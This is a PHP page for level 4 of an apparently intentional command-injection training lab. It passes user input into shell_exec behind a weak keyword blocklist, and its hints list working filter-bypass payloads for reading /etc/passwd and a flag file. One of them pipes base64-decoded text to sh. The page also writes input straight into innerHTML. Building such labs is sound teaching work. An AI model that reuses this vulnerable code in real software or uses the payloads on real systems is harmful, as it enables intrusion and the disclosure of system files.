<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 4 - Keyword Filter Bypass</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Level 4 - Keyword Filter Bypass</h1>
            <p><strong>Objective:</strong> Bypass keyword filtering để thực hiện command injection</p>
        </div>

        <div class="form-container">
            <h3>🔍 Process Monitor:</h3>
            <p>Công cụ này hiển thị thông tin process. <strong>Security:</strong> Dangerous keywords are blocked!</p>
            
            <div class="code-block">Command: ps aux | grep <?php echo htmlspecialchars($_GET['process'] ?? '[PROCESS]'); ?></div>
            
            <?php
            if (isset($_GET['process'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $process = $_GET['process'];
                
                // Security filters - block dangerous keywords
                $blocked_keywords = ['cat', 'less', 'more', 'head', 'tail', 'flag', 'passwd', 'shadow'];
                $is_blocked = false;
                
                foreach ($blocked_keywords as $keyword) {
                    if (stripos($process, $keyword) !== false) {
                        $is_blocked = true;
                        echo '<div class="error">❌ Security Alert: Keyword "' . $keyword . '" is blocked!</div>';
                        break;
                    }
                }
                
                if (!$is_blocked) {
                    $command = "ps aux | grep " . $process;
                    $output = shell_exec($command);
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo 'No output or command failed';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="process">Process Name:</label>
                    <input type="text" id="process" name="process" value="<?php echo htmlspecialchars($_GET['process'] ?? ''); ?>" placeholder="Enter process name (e.g., apache)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Search Process</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🚫 Active Security Filters</h3>
                <p><strong>Blocked Keywords:</strong> cat, less, more, head, tail, flag, passwd, shadow</p>
                <p><strong>Filter Method:</strong> Case-insensitive string matching</p>
                <p><strong>Challenge:</strong> Execute blocked commands without using blocked words</p>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔄 Keyword Bypass Techniques</h3>
                <ul>
                    <li><strong>String Concatenation:</strong> 'c'+'at', "c"+"at"</li>
                    <li><strong>Variable Usage:</strong> $a=ca; $b=t; $a$b</li>
                    <li><strong>Command Substitution:</strong> $(echo cat)</li>
                    <li><strong>Wildcard:</strong> /bin/c?t, /bin/ca*</li>
                    <li><strong>Escape Characters:</strong> c\at, ca\t</li>
                    <li><strong>Base64 Encoding:</strong> echo Y2F0 | base64 -d</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding the Filter</h4>
                    <p><strong>Current Command:</strong> <code>ps aux | grep [YOUR_INPUT]</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>apache</code> (should work)</p>
                    <p>🚫 <strong>Test blocked:</strong> <code>apache; cat /etc/passwd</code> (cat is blocked)</p>
                    <p>🎯 <strong>Challenge:</strong> Read files without using blocked keywords</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: String Concatenation</h4>
                    <p><strong>Concept:</strong> Break keywords into parts to bypass detection</p>
                    <p>📝 <strong>Bash concatenation:</strong> <code>apache; c'a't /etc/passwd</code></p>
                    <p>📝 <strong>Alternative:</strong> <code>apache; "c"a"t" /etc/passwd</code></p>
                    <p>🎯 <strong>How it works:</strong> Quotes break the string but command still executes</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>apache; c''at /etc/passwd</code></p>
                    <p>• <code>apache; ca''t /etc/passwd</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Variable Usage</h4>
                    <p><strong>Concept:</strong> Use variables to construct commands</p>
                    <p>📝 <strong>Test:</strong> <code>apache; a=c; b=at; $a$b /etc/passwd</code></p>
                    <p>🎯 <strong>Advanced:</strong> <code>apache; x=ca; y=t; $x$y /etc/passwd</code></p>
                    <p><strong>One-liner version:</strong></p>
                    <p>• <code>apache; ${x}at /etc/passwd</code> (where x=c)</p>
                    <p>• <code>apache; a=c;b=at;$a$b /etc/passwd</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Command Substitution</h4>
                    <p><strong>Concept:</strong> Use command substitution to build commands</p>
                    <p>📝 <strong>Test:</strong> <code>apache; $(echo c""at) /etc/passwd</code></p>
                    <p>📝 <strong>Alternative:</strong> <code>apache; `echo ca''t` /etc/passwd</code></p>
                    <p><strong>Complex example:</strong></p>
                    <p>• <code>apache; $(echo -e \\x63\\x61\\x74) /etc/passwd</code></p>
                    <p>• <code>apache; $(printf %s ca)t /etc/passwd</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Wildcards and Escape Characters</h4>
                    <p><strong>Wildcard matching:</strong></p>
                    <p>📝 <strong>Test:</strong> <code>apache; /bin/c?t /etc/passwd</code></p>
                    <p>📝 <strong>Alternative:</strong> <code>apache; /bin/ca* /etc/passwd</code></p>
                    <p><strong>Escape characters:</strong></p>
                    <p>• <code>apache; c\\at /etc/passwd</code></p>
                    <p>• <code>apache; ca\\t /etc/passwd</code></p>
                    <p><strong>Path alternatives:</strong></p>
                    <p>• <code>apache; /usr/bin/tail /etc/passwd</code> (if tail is blocked, use absolute path)</p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: Base64 and Alternative Commands</h4>
                    <p><strong>Base64 encoding bypass:</strong></p>
                    <p>📝 <code>echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh</code></p>
                    <p><strong>Alternative file reading commands:</strong></p>
                    <p>• <code>apache; od -c /etc/passwd</code> (octal dump)</p>
                    <p>• <code>apache; xxd /etc/passwd</code> (hex dump)</p>
                    <p>• <code>apache; strings /etc/passwd</code></p>
                    <p>• <code>apache; nl /etc/passwd</code> (number lines)</p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 7: Find the Flag!</h4>
                    <p><strong>🚀 Target:</strong> Need to read files with "flag" in the name</p>
                    <p><strong>Method 1 (Concatenation):</strong> <code>apache; c'a't /var/www/secret_f''lag.txt</code></p>
                    <p><strong>Method 2 (Variables):</strong> <code>apache; a=c;b=at;$a$b /var/www/secret_fla''g.txt</code></p>
                    <p><strong>Method 3 (Wildcard):</strong> <code>apache; /bin/c?t /var/www/secret_f*</code></p>
                    <p><strong>Method 4 (Command sub):</strong> <code>apache; $(echo c""at) /var/www/secret_f''lag.txt</code></p>
                    <p><strong>Method 5 (Alternative):</strong> <code>apache; od -c /var/www/secret_f''lag.txt</code></p>
                    <p><strong>💡 Exploration:</strong> <code>apache; find /var/www -name "*f*" | grep -v f''lag</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level3.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level5.php">➡️ Next Level</a>
            <a href="submit.php?level=4">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 7;

    function updateCommand() {
        const input = document.getElementById('process').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: ps aux | grep ' + (input || '[PROCESS]');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
